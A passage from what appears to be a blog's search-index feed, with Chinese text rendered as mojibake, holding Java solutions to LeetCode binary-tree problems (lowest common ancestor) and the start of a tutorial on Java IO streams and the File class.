class="keyword">if</span> (count == maxCount)&#123;</span><br><span class="line">            resList.add(rootValue);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root;</span><br><span class="line">        findMode1(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="236-äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"><a href="#236-äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ" class="headerlink" title="236. äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"></a>236. äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</h2><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚</p><p>ç™¾åº¦ç™¾ç§‘ä¸­æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ä¸ºï¼šâ€œå¯¹äºæœ‰æ ¹æ ‘ T çš„ä¸¤ä¸ªèŠ‚ç‚¹ pã€qï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆè¡¨ç¤ºä¸ºä¸€ä¸ªèŠ‚ç‚¹ xï¼Œæ»¡è¶³ x æ˜¯ pã€q çš„ç¥–å…ˆä¸” x çš„æ·±åº¦å°½å¯èƒ½å¤§ï¼ˆä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆï¼‰ã€‚â€<br>é€’å½’æ³•è§£å†³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span> || root == p || root == q)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºéå†</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿­ä»£æ³•è§£å†³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root, pre = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span> || !st.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">                st.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = st.pop();</span><br><span class="line">            <span class="keyword">if</span>(cur.right == <span class="literal">null</span> || cur.right == pre)&#123;</span><br><span class="line">                <span class="comment">// p/qæ˜¯ ä¸­/å·¦ æˆ–è€… ä¸­/å³ , è¿”å›ä¸­</span></span><br><span class="line">                <span class="keyword">if</span>(cur == p || cur == q)&#123;</span><br><span class="line">                    <span class="keyword">if</span> ((cur.left != <span class="literal">null</span> &amp;&amp; cur.left.val == max) || (cur.right != <span class="literal">null</span> &amp;&amp; cur.right.val == max))&#123;</span><br><span class="line">                        <span class="keyword">return</span> cur;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cur.val = max;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// p/qæ˜¯ å·¦/å³ , è¿”å›ä¸­</span></span><br><span class="line">                <span class="keyword">if</span> (cur.left != <span class="literal">null</span> &amp;&amp; cur.left.val == max &amp;&amp; cur.right != <span class="literal">null</span> &amp;&amp; cur.right.val == max)&#123;</span><br><span class="line">                    <span class="keyword">return</span> cur;                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// MAX_VALUE å¾€ä¸Šä¼ é€’</span></span><br><span class="line">                <span class="keyword">if</span>((cur.left != <span class="literal">null</span> &amp;&amp; cur.left.val == max) || (cur.right != <span class="literal">null</span> &amp;&amp; cur.right.val == max))&#123;</span><br><span class="line">                    cur.val = max;</span><br><span class="line">                &#125;</span><br><span class="line">                pre = cur;</span><br><span class="line">                cur = <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                st.push(cur);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒå‰æ ‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå¼€å‘ã€‘Java IOè¯¦è§£</title>
      <link href="/2024/10/25/code/javaIO/"/>
      <url>/2024/10/25/code/javaIO/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/25/code/javaIO/image.png"></p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>Java IOï¼ˆè¾“å…¥&#x2F;è¾“å‡ºï¼‰æ˜¯ Java ç¼–ç¨‹è¯­è¨€ä¸­å¤„ç†è¾“å…¥å’Œè¾“å‡ºæ“ä½œçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä½äº <code>java.io</code> åŒ…ä¸­ã€‚è¿™ä¸ªåŒ…æä¾›äº†ä¸°å¯Œçš„ç±»å’Œæ¥å£ï¼Œç”¨äºè¯»å†™æ•°æ®åˆ°æ–‡ä»¶ã€ç½‘ç»œè¿æ¥æˆ–å…¶ä»–æºã€‚</p><h3 id="Java-IO-çš„ä¸»è¦ç»„æˆ"><a href="#Java-IO-çš„ä¸»è¦ç»„æˆ" class="headerlink" title="Java IO çš„ä¸»è¦ç»„æˆ"></a>Java IO çš„ä¸»è¦ç»„æˆ</h3><p>Java IO ä¸»è¦å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼šæµï¼ˆStreamï¼‰å’Œè¯»å†™å™¨ï¼ˆReader&#x2F;Writerï¼‰ã€‚å…¶å®ä¹Ÿå°±æ˜¯æŒ‰ç…§ä¼ è¾“æ–¹å¼åˆ’åˆ†å¯ä»¥åˆ†ä¸ºï¼šæŒ‰å­—èŠ‚ä¼ è¾“ã€æŒ‰å­—ç¬¦ä¼ è¾“ï¼Œé€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªå­—æ¯æˆ–ä¸€ä¸ªå­—ç¬¦å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªæ±‰å­—å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼Œå…·ä½“è¿˜è¦çœ‹å­—ç¬¦ç¼–ç ï¼Œæ¯”å¦‚è¯´åœ¨ UTF-8 ç¼–ç ä¸‹ï¼Œä¸€ä¸ªè‹±æ–‡å­—æ¯ï¼ˆä¸åˆ†å¤§å°å†™ï¼‰ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡æ±‰å­—ä¸ºä¸‰ä¸ªå­—èŠ‚ï¼›åœ¨ Unicode ç¼–ç ä¸­ï¼Œä¸€ä¸ªè‹±æ–‡å­—æ¯ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡æ±‰å­—ä¸ºä¸¤ä¸ªå­—èŠ‚ã€‚</p><p>å­—èŠ‚æµç”¨æ¥å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´å›¾ç‰‡å•Šã€MP3 å•Šã€è§†é¢‘å•Šã€‚<br>å­—ç¬¦æµç”¨æ¥å¤„ç†æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡æœ¬æ–‡ä»¶å¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§ç‰¹æ®Šçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåªä¸è¿‡ç»è¿‡äº†ç¼–ç ï¼Œä¾¿äºäººä»¬é˜…è¯»ã€‚<br>æ¢å¥è¯è¯´å°±æ˜¯ï¼Œ<strong>å­—èŠ‚æµå¯ä»¥å¤„ç†ä¸€åˆ‡æ–‡ä»¶ï¼Œè€Œå­—ç¬¦æµåªèƒ½å¤„ç†æ–‡æœ¬</strong>ã€‚å­—èŠ‚æµæœ¬èº«æ²¡æœ‰ç¼“å†²åŒºï¼Œç¼“å†²å­—èŠ‚æµç›¸å¯¹äºå­—èŠ‚æµï¼Œæ•ˆç‡æå‡éå¸¸é«˜ã€‚è€Œå­—ç¬¦æµæœ¬èº«å°±å¸¦æœ‰ç¼“å†²åŒºï¼Œç¼“å†²å­—ç¬¦æµç›¸å¯¹äºå­—ç¬¦æµæ•ˆç‡æå‡å°±ä¸æ˜¯é‚£ä¹ˆå¤§äº†ã€‚</p><ol><li><p><strong>æµï¼ˆStreamï¼‰</strong></p><ul><li><strong>å­—èŠ‚æµ</strong>ï¼šä»¥å­—èŠ‚ä¸ºå•ä½å¤„ç†æ•°æ®ã€‚ä¸»è¦ç±»åŒ…æ‹¬ <code>InputStream</code> å’Œ <code>OutputStream</code>ã€‚</li><li><strong>è¿‡æ»¤æµ</strong>ï¼šåœ¨è¾“å…¥æˆ–è¾“å‡ºæµä¸Šæä¾›é¢å¤–çš„åŠŸèƒ½ï¼Œå¦‚ç¼“å†²ã€æ•°æ®è½¬æ¢ç­‰ã€‚å¸¸è§çš„è¿‡æ»¤æµåŒ…æ‹¬ <code>BufferedInputStream</code> å’Œ <code>BufferedOutputStream</code>ã€‚</li></ul></li><li><p><strong>è¯»å†™å™¨ï¼ˆReader&#x2F;Writerï¼‰</strong></p><ul><li><strong>å­—ç¬¦æµ</strong>ï¼šä»¥å­—ç¬¦ä¸ºå•ä½å¤„ç†æ•°æ®ï¼Œæ›´é€‚åˆå¤„ç†æ–‡æœ¬æ•°æ®ã€‚ä¸»è¦ç±»åŒ…æ‹¬ <code>Reader</code> å’Œ <code>Writer</code>ã€‚</li><li><strong>è½¬æ¢æµ</strong>ï¼š<code>InputStreamReader</code> å’Œ <code>OutputStreamWriter</code>ï¼Œå®ƒä»¬å¯ä»¥å°†å­—èŠ‚æµå’Œå­—ç¬¦æµä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</li></ul></li></ol><p><strong>InputStream ç±»</strong></p><ul><li><code>int read()</code>ï¼šè¯»å–æ•°æ®</li><li><code>int read(byte b[], int off, int len)</code>ï¼šä»ç¬¬ off ä½ç½®å¼€å§‹è¯»ï¼Œè¯»å– len é•¿åº¦çš„å­—èŠ‚ï¼Œç„¶åæ”¾å…¥æ•°ç»„ b ä¸­</li><li><code>long skip(long n)</code>ï¼šè·³è¿‡æŒ‡å®šä¸ªæ•°çš„å­—èŠ‚</li><li><code>int available()</code>ï¼šè¿”å›å¯è¯»çš„å­—èŠ‚æ•°</li><li><code>void close()</code>ï¼šå…³é—­æµï¼Œé‡Šæ”¾èµ„æº</li></ul><p><strong>OutputStream ç±»</strong></p><ul><li><code>void write(int b)</code>ï¼š å†™å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œè™½ç„¶å‚æ•°æ˜¯ä¸€ä¸ª int ç±»å‹ï¼Œä½†åªæœ‰ä½ 8 ä½æ‰ä¼šå†™å…¥ï¼Œé«˜ 24 ä½ä¼šèˆå¼ƒ</li><li><code>void write(byte b[], int off, int len)</code>ï¼š å°†æ•°ç»„ b ä¸­çš„ä» off ä½ç½®å¼€å§‹ï¼Œé•¿åº¦ä¸º len çš„å­—èŠ‚å†™å…¥</li><li><code>void flush()</code>ï¼š å¼ºåˆ¶åˆ·æ–°ï¼Œå°†ç¼“å†²åŒºçš„æ•°æ®å†™å…¥</li><li><code>void close()</code>ï¼šå…³é—­æµ</li></ul><p><strong>Reader ç±»</strong></p><ul><li><code>int read()</code>ï¼šè¯»å–å•ä¸ªå­—ç¬¦</li><li><code>int read(char cbuf[], int off, int len)</code>ï¼šä»ç¬¬ off ä½ç½®å¼€å§‹è¯»ï¼Œè¯»å– len é•¿åº¦çš„å­—ç¬¦ï¼Œç„¶åæ”¾å…¥æ•°ç»„ b ä¸­</li><li><code>long skip(long n)</code>ï¼šè·³è¿‡æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦</li><li><code>int ready()</code>ï¼šæ˜¯å¦å¯ä»¥è¯»äº†</li><li><code>void close()</code>ï¼šå…³é—­æµï¼Œé‡Šæ”¾èµ„æº</li></ul><p><strong>Writer ç±»</strong></p><ul><li><code>void write(int c)</code>ï¼š å†™å…¥ä¸€ä¸ªå­—ç¬¦</li><li>&#96;void write( char cbuf[], int off, int len)ï¼š å°†æ•°ç»„ cbuf ä¸­çš„ä» off ä½ç½®å¼€å§‹ï¼Œé•¿åº¦ä¸º len çš„å­—ç¬¦å†™å…¥</li><li><code>void flush()</code>ï¼š å¼ºåˆ¶åˆ·æ–°ï¼Œå°†ç¼“å†²åŒºçš„æ•°æ®å†™å…¥</li><li><code>void close()</code>ï¼šå…³é—­æµ</li></ul><h3 id="å¸¸ç”¨çš„-Java-IO-ç±»"><a href="#å¸¸ç”¨çš„-Java-IO-ç±»" class="headerlink" title="å¸¸ç”¨çš„ Java IO ç±»"></a>å¸¸ç”¨çš„ Java IO ç±»</h3><ul><li><code>File</code>ï¼šä»£è¡¨æ–‡ä»¶å’Œç›®å½•è·¯å¾„åçš„æŠ½è±¡è¡¨ç¤ºå½¢å¼ã€‚</li><li><code>FileInputStream</code>&#x2F;<code>FileOutputStream</code>ï¼šç”¨äºè¯»å–å’Œå†™å…¥æ–‡ä»¶æ•°æ®çš„å­—èŠ‚æµã€‚</li><li><code>BufferedReader</code>&#x2F;<code>BufferedWriter</code>ï¼šæä¾›ç¼“å†²çš„å­—ç¬¦æµï¼Œå¢åŠ æ•ˆç‡ã€‚</li><li><code>PrintWriter</code>ï¼šå…·æœ‰è‡ªåŠ¨è¡Œåˆ·æ–°çš„å­—ç¬¦è¾“å‡ºæµï¼Œå¯ä»¥è¾“å‡ºä¸åŒæ•°æ®ç±»å‹çš„æ ¼å¼åŒ–è¡¨ç¤ºã€‚</li></ul><h3 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h3><p>ä¸‹é¢æ˜¯ä½¿ç”¨ Java IO ç±»è¿›è¡Œæ–‡ä»¶è¯»å†™çš„åŸºæœ¬ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaIOExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>)))) &#123;</span><br><span class="line">            writer.println(<span class="string">&quot;Hello Java IO!&quot;</span>);</span><br><span class="line">            writer.println(<span class="string">&quot;Here is the second line.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯»å–æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;output.txt&quot;</span>))) &#123;</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨"><a href="#åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨" class="headerlink" title="åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨"></a>åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨</h3><p>Java IO åœ¨ç®—æ³•ä¸­å¸¸ç”¨äºæ•°æ®çš„è¯»å–å’Œå†™å…¥ï¼Œæ¯”å¦‚ä»æ–‡ä»¶è¯»å–æ•°æ®è¿›è¡Œå¤„ç†ï¼Œæˆ–å°†å¤„ç†ç»“æœå†™å…¥æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œåœ¨æ•°æ®åˆ†æã€æ—¥å¿—å¤„ç†å’Œå¤§æ•°æ®å¤„ç†ä¸­ï¼Œé¢‘ç¹çš„æ–‡ä»¶è¯»å†™æ“ä½œæ˜¯å¿…ä¸å¯å°‘çš„ã€‚ä½¿ç”¨ç¼“å†²æµï¼ˆå¦‚ <code>BufferedReader</code> å’Œ <code>BufferedWriter</code>ï¼‰å¯ä»¥æ˜¾è‘—æé«˜è¯»å†™æ•ˆç‡ã€‚</p><h3 id="æ“ä½œå¯¹è±¡åˆ’åˆ†"><a href="#æ“ä½œå¯¹è±¡åˆ’åˆ†" class="headerlink" title="æ“ä½œå¯¹è±¡åˆ’åˆ†"></a>æ“ä½œå¯¹è±¡åˆ’åˆ†</h3><p><img src="/2024/10/25/code/javaIO/image-1.png"><br>æ–‡ä»¶æ“ä½œç®—æ˜¯ IO ä¸­æœ€å…¸å‹çš„æ“ä½œäº†ï¼Œä¹Ÿæ˜¯æœ€é¢‘ç¹çš„æ“ä½œã€‚é‚£å…¶å®ä½ å¯ä»¥æ¢ä¸ªè§’åº¦æ¥æ€è€ƒï¼Œæ¯”å¦‚è¯´æŒ‰ç…§ IO çš„æ“ä½œå¯¹è±¡æ¥æ€è€ƒï¼ŒIO å°±å¯ä»¥åˆ†ç±»ä¸ºï¼šæ–‡ä»¶ã€æ•°ç»„ã€ç®¡é“ã€åŸºæœ¬æ•°æ®ç±»å‹ã€ç¼“å†²ã€æ‰“å°ã€å¯¹è±¡åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ï¼Œä»¥åŠè½¬æ¢ç­‰ã€‚</p><h2 id="Java-Flie"><a href="#Java-Flie" class="headerlink" title="Java Flie"></a>Java Flie</h2><p>java.io.File ç±»æ˜¯ä¸“é—¨å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œçš„ç±»ï¼Œæ³¨æ„åªèƒ½å¯¹æ–‡ä»¶æœ¬èº«è¿›è¡Œæ“ä½œï¼Œä¸èƒ½å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ“ä½œï¼Œæƒ³è¦æ“ä½œå†…å®¹ï¼Œå¿…é¡»å€ŸåŠ©è¾“å…¥è¾“å‡ºæµã€‚</p><h3 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶è·¯å¾„å</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/Users/username/123.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line"><span class="comment">// æ–‡ä»¶è·¯å¾„å</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path2</span> <span class="operator">=</span> <span class="string">&quot;/Users/username/1/2.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path2); -------------ç›¸å½“äº/Users/username/<span class="number">1</span>/<span class="number">2.</span>txt</span><br><span class="line"><span class="comment">// é€šè¿‡çˆ¶è·¯å¾„å’Œå­è·¯å¾„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">String</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="string">&quot;/Users/username/aaa&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">child</span> <span class="operator">=</span> <span class="string">&quot;bbb.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(parent, child); --------ç›¸å½“äº/Users/username/aaa/bbb.txt</span><br><span class="line"><span class="comment">// é€šè¿‡çˆ¶çº§Fileå¯¹è±¡å’Œå­è·¯å¾„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">File</span> <span class="variable">parentDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/aaa&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">child</span> <span class="operator">=</span> <span class="string">&quot;bbb.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(parentDir, child); --------ç›¸å½“äº/Users/username/aaa/bbb.txt</span><br></pre></td></tr></table></figure><ol><li>ä¸€ä¸ª File å¯¹è±¡ä»£è¡¨ç¡¬ç›˜ä¸­å®é™…å­˜åœ¨çš„ä¸€ä¸ªæ–‡ä»¶æˆ–è€…ç›®å½•ã€‚</li><li>File ç±»çš„æ„é€ æ–¹æ³•ä¸ä¼šæ£€éªŒè¿™ä¸ªæ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦çœŸå®å­˜åœ¨ï¼Œå› æ­¤æ— è®ºè¯¥è·¯å¾„ä¸‹æ˜¯å¦å­˜åœ¨æ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œéƒ½ä¸å½±å“ File å¯¹è±¡çš„åˆ›å»ºã€‚</li></ol><h3 id="å¸¸ç”¨æ–¹æ³•"><a href="#å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a>å¸¸ç”¨æ–¹æ³•</h3><p>File çš„å¸¸ç”¨æ–¹æ³•ä¸»è¦åˆ†ä¸ºè·å–åŠŸèƒ½ã€è·å–ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ã€åˆ¤æ–­åŠŸèƒ½ã€åˆ›å»ºåˆ é™¤åŠŸèƒ½çš„æ–¹æ³•ã€‚</p><ol><li>è·å–åŠŸèƒ½çš„æ–¹æ³•<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/aaa/bbb.java&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;æ–‡ä»¶ç»å¯¹è·¯å¾„:&quot;</span>+f.getAbsolutePath());</span><br><span class="line">System.out.println(<span class="string">&quot;æ–‡ä»¶æ„é€ è·¯å¾„:&quot;</span>+f.getPath());</span><br><span class="line">System.out.println(<span class="string">&quot;æ–‡ä»¶åç§°:&quot;</span>+f.getName());</span><br><span class="line">System.out.println(<span class="string">&quot;æ–‡ä»¶é•¿åº¦:&quot;</span>+f.length()+<span class="string">&quot;å­—èŠ‚&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/aaa&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;ç›®å½•ç»å¯¹è·¯å¾„:&quot;</span>+f2.getAbsolutePath());</span><br><span class="line">System.out.println(<span class="string">&quot;ç›®å½•æ„é€ è·¯å¾„:&quot;</span>+f2.getPath());</span><br><span class="line">System.out.println(<span class="string">&quot;ç›®å½•åç§°:&quot;</span>+f2.getName());</span><br><span class="line">System.out.println(<span class="string">&quot;ç›®å½•é•¿åº¦:&quot;</span>+f2.length());</span><br></pre></td></tr></table></figure></li><li>ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç»å¯¹è·¯å¾„ç¤ºä¾‹</span></span><br><span class="line"><span class="type">File</span> <span class="variable">absoluteFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example/test.txt&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;ç»å¯¹è·¯å¾„ï¼š&quot;</span> + absoluteFile.getAbsolutePath());</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›¸å¯¹è·¯å¾„ç¤ºä¾‹</span></span><br><span class="line"><span class="type">File</span> <span class="variable">relativeFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span 